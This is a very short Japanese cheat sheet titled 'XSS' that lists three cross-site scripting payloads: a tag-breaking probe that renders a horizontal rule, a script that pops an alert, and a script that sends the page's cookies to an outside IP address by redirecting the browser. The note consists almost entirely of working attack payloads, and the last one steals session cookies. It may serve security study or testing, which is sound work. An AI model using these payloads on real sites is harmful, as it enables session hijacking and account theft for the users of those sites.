# XSS

* XSS

1. `'>"><hr>`を使用して水平線を表示
2. `<script>alert(1)</script>`でアラート表示
3. `<script>document.location="http://[ip address]/" + document.cookie</script>`でクッキーを外部に送信
